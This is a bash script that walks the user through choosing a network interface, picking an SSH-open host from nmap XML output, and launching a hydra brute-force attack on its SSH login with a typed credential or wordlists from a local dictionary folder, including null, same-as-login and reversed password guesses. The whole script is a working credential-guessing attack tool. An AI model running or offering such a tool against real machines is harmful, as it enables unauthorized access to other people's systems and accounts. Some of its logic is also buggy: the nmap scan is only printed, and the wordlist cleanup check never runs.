#!/bin/bash

transparent="\e[0m"
bReverse="\e[7;1m"
title="\e[3;33m"
red="\033[1;31m"
green="\033[1;32m"

#---------------------------------User select the interface------------------------------
ans="n"
$networkC
allInterface=$(ip link show | grep '^[1-9]' | cut -d ' ' -f 2  | cut -d ":" -f -1 | grep -v "lo")
while [ $ans != "y" ]
do
	for interface in $allInterface
		do
		clear
		echo -e $title" choose the interface :"$transparent
		echo -e $bReverse""$interface" (y/n)"$transparent
		read ans
		if [ $ans = "y" ]; then
			netMask=$(sudo ip a show $interface | grep "inet " | cut -d " " -f 6 | cut -d "/" -f 2)
			network=$(sudo route -n | grep $interface | cut -d " " -f 1 | grep -v "0.0.0.0")
			networkC=$network"/"$netMask
			if [ -z $network ]; then
				echo "interface not initialized"
				exit
			fi
		fi
	done
done

#---------------------------------Scann the network------------------------------
#rm result/scanNetwork/scanSSH 2> /dev/null

# -p 22 because 22 is the ssh port
# -oX because we want a XML output file, it's easier to manipulate
# for more information go to https://nmap.org/ or see nmap -h
#nmap -p 22 $networkC --open -oX result/scanNetwork/scanSSH
echo "sudo nmap -p 22 $networkC -oX --open"
declare -a hostnamesArray
hostnamesArray=($(xml_grep 'hostname' result/scanNetwork/scanSSH | grep "hostname" | cut -d '"' -f2))
statesArray=($(xml_grep 'state' result/scanNetwork/scanSSH | grep "state" | cut -d '"' -f 6))
addressArray=($(xml_grep 'address' result/scanNetwork/scanSSH | grep "address" | cut -d '"' -f2))

#---------------------------------User select a target------------------------------
ans="n"
i=0
# set how many host you can see in the same time on the screen
if [ ${#statesArray[@]} -gt 4 ]; then 
	nDisplay=4
else
	nDisplay=$((${#statesArray[@]}-1))
fi
while [ $ans != "y" ]
do
	clear
	echo -e $title"Select a target"$transparent
	if [  ${statesArray[i]} = "open" ]; then
		colorS=$green
	else
		colorS=$red
	fi
	
	echo -e $bReverse""${hostnamesArray[i]}" "$transparent"state: "$colorS" "${statesArray[i]}$transparent
	echo "|-> adress "${addressArray[i]}

	for j in `seq $(($i+1)) $nDisplay`; 
	do
		modJ=$(($j % ${#statesArray[@]}))
		if [  ${statesArray[$modJ]} = "open" ]; then
			colorS=$green
		else
			colorS=$red
		fi
		echo -e "${hostnamesArray[modJ]}" "state: "$colorS" "${statesArray[modJ]}$transparent
		echo "|-> adress "${addressArray[modJ]}
	done
	
	read ans
	if [ $ans = "y" ]; then
		break
	else
	i=$((($i+1)%${#statesArray[@]}))
	fi
done

#--------------------------------- -----------------------------------------

username=""
password=""
bool="0"
echo "Now if you know the username press y"
echo -e "Now if you$red don't know$transparent the username press n"
read ans
if [ $ans = "n" ]; then
	dicoArray=($(ls conf/dico))
	if [ ${#dicoArray[@]} -gt 8 ]; then 
		nDisplay=4
	else
		nDisplay=$((${#dicoArray[@]}-1))
	fi
	k=0
	ans="n"
	while [ $ans != "y" ]
	do
		clear
		echo "Ok so you need to use a dictionnary."
		echo "please select a dictionnary :"
		echo -e $bReverse""${dicoArray[k]}" "$transparent

		for j in `seq $(($k+1)) $nDisplay`; 
		do
			modJ=$(($j % ${#dicoArray[@]}))
			echo ${dicoArray[modJ]}
		done
		read ans
		if [ $ans = "y" ]; then
			break
		else
		k=$((($k+1)%${#dicoArray[@]}))
		fi
	done
	username=$PWD"/conf/dico/"${dicoArray[k]}
	sed -i "1i${hostnamesArray[i]}" "$username"
	echo "sed -i "1i${hostnamesArray[i]}" "$username""
	bool="1"
	username="-L '$username'"
	
	
else
	clear
	echo "please enter the username :"
	read username
	#add the name of the computer in the username dictionnary
	username="-l "$username
fi


echo "Now if you know the password press y"
echo -e "Now if you$red don't know$transparent the password press n"
read ans
echo $ans
if [ $ans = "n" ] ; then
	dicoArray=($(ls conf/dico))
	if [ ${#dicoArray[@]} -gt 8 ]; then 
		nDisplay=4
	else
		nDisplay=$((${#dicoArray[@]}-1))
	fi
	p=0
	while [ $ans != "y" ]
	do
		clear
		echo "Ok so you need to use a dictionnary."
		echo "please select a dictionnary :"
		echo -e $bReverse""${dicoArray[p]}" "$transparent

		for j in `seq $(($p+1)) $nDisplay`; 
		do
			modJ=$(($j % ${#dicoArray[@]}))
			echo ${dicoArray[modJ]}
		done
		
		read ans
		if [ $ans = "y" ]; then
			break
		else
		p=$((($p+1)%${#dicoArray[@]}))
		fi
	done
	password=$PWD"/conf/dico/"${dicoArray[p]}
	password="-P '$password'"
	
else
	clear
	echo "please enter the password :"
	read password
	password="-p "$password
fi

echo $username
echo $password

echo hydra -s 22 -v $username $password -e nsr -F ${addressArray[i]} ssh -I
hydra -s 22 -v $username $password -e nsr -F ${addressArray[i]} ssh -I
# Supress the line we hadded in the user dictionnary
if [ bool = '1' ]; then
	sed -i '1d' "conf/dico/${dicoArray[k]}"
fi

	
	
	
	
	
	
	
	
	
	
	
	
	
	
	

